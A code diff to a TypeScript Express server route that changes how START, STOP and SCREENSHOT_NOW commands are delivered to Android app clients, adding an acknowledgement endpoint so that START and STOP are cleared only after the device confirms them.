@@ -385,10 +385,13 @@ router.get('/command', (req: Request, res: Response) => {
         const autoScreenshot = cmd ? cmd.auto_screenshot : 0;
         const screenshotInterval = cmd ? cmd.screenshot_interval : 30;
         
-        // If a command was fetched, clear it so we don't trigger it again endlessly
-        if (commandStr === 'START' || commandStr === 'STOP' || commandStr === 'SCREENSHOT_NOW') {
+        // Don't clear START/STOP commands here — wait for the APK to acknowledge via /command/ack
+        // Only clear transient one-shot commands that don't need reliability
+        if (commandStr === 'SCREENSHOT_NOW') {
              db.clearDeviceCommand(client_id);
-             console.log(`[broadcast] Remote command consumed by ${client_id}: ${commandStr}`);
+             console.log(`[broadcast] Transient command consumed by ${client_id}: ${commandStr}`);
+        } else if (commandStr === 'START' || commandStr === 'STOP') {
+             console.log(`[broadcast] Command delivered to ${client_id}: ${commandStr} (awaiting ACK)`);
         }
 
         res.json({ 
@@ -396,6 +399,28 @@ router.get('/command', (req: Request, res: Response) => {
             auto_screenshot: autoScreenshot,
             screenshot_interval: screenshotInterval
         });
+    } catch (err: any) {
+        res.status(500).json({ status: 'error', message: err.message });
+    }
+});
+
+// APK acknowledges it successfully processed a command
+router.post('/command/ack', (req: Request, res: Response) => {
+    try {
+        const { client_id, command } = req.body;
+        if (!client_id || !command) {
+            res.status(400).json({ status: 'error', message: 'Missing client_id or command' });
+            return;
+        }
+        
+        // Only clear the command if it matches what the APK is acknowledging
+        const current = db.getDeviceCommand(client_id);
+        if (current && current.command === command) {
+            db.clearDeviceCommand(client_id);
+            console.log(`[broadcast] Command ACK received from ${client_id}: ${command}`);
+        }
+        
+        res.json({ status: 'acknowledged', client_id, command });
     } catch (err: any) {
         res.status(500).json({ status: 'error', message: err.message });
     }
